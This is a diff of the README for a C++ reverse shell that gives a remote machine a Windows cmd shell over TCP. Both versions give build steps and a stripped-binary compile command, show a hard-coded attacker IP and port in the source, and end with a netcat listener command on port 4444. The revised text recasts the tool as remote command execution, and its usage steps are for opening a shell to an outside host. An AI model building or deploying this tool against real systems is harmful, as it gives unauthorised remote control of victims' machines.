@@ -1,36 +1,30 @@
 # C ++ Reverse Shell
 
-This is a simple C++ based reverse shell give us a windows  cmd shell over TCP .  
+Connect Windows host to a remote machine and run Windows shell commands remotely over TCP.
 
+## Building
 
-## installation
+Prerequisite: MinGW or MSYS2 compiler toolchain.
 
-    $ apt install mingw-w64
-    $ git clone https://github.com/dev-frog/C-Reverse-Shell.git
-    $ cd C-Reverse-Shell
-  
+```
+git clone https://github.com/dev-frog/C-Reverse-Shell.git
+cd C-Reverse-Shell
+make
+```  
 
+## Testing
 
-##  change The IP and Port number in the source code
+On the Windows machine:
 
-There is **re.cpp** file you have to open and change the **ip address** and **port number**
+```
+./c-reverse-shell.exe 192.168.1.3 4444
+```
 
-![alt text](https://github.com/dev-frog/C-Reverse-Shell/blob/master/img/re.PNG)
+On the remote machine:
 
-    70 else {
-    71    char host[] = "192.168.0.101";  // change this to your ip address
-    72    int port = 4444;                //chnage this to your open port
-    73    RunShell(host, port);
-    74}
-    
+```
+netcat -lvnp 4444
+```
 
-
-## Compile it
-
-    i686-w64-mingw32-g++ re.cpp -o re.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
-
-## Start  the netcat Listener
- 
-
-     nc -lvnp <port number>
+Start typing commands on the remote machine, right after receiving "Connection from..." message.
 
